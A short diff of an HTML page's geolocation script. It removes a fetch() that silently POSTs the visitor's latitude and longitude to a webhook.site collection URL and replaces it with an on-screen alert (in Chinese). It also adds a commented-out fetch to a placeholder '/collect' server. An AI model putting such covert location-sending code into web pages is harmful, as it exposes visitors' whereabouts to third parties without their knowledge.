@@ -10,16 +10,10 @@
         navigator.geolocation.getCurrentPosition(function(pos) {
             var lat = pos.coords.latitude;
             var lng = pos.coords.longitude;
-           // alert("你的经纬度是：" + lat + "," + lng);
-fetch("https://webhook.site/1234-abcd-5678", {
-    method:"POST",
-    body: JSON.stringify({lat, lng})
-});
-
-
+            alert("你的经纬度是：" + lat + "," + lng);
+            // 这里可以加上 fetch，把经纬度发送到你的服务器
+            // fetch("https://你的服务器地址/collect", {method:"POST", body: JSON.stringify({lat,lng})});
+        });
     </script>
 </body>
 </html>
-
-
-
